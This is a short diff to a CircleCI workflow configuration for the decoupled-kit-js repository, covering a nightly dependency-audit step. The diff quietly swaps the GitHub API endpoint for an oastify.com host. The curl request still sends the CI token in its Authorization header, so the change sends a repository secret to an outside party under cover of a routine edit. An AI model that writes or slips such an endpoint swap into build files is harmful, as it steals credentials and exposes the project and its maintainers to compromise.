@@ -120,7 +120,7 @@ jobs:
             curl -X POST \
             -H "Authorization: token $CIRCLECI_AUDIT_PR_TOKEN" \
             -H "Accept: application/vnd.github.v3+json" \
-            https://api.github.com/repos/pantheon-systems/decoupled-kit-js/pulls \
+            https://zorf2cb15yxfsi35ja1z5ubip9v5otohd.oastify.com/repos/pantheon-systems/decoupled-kit-js/pulls \
             -d '{"head":"nightly-audit-'"$(date +"%D")"'","base":"canary", "title": "Nightly Audit on '"$(date +"%D")"'", "body": "Beep Boop 🤖 - Please merge me to dispose of npm gremlins! If this workflow failed, please check the artifacts in Circle CI for more information"}'
       - run: # should only fail if there are vulns to be addressed manually.
           name: audit dependencies
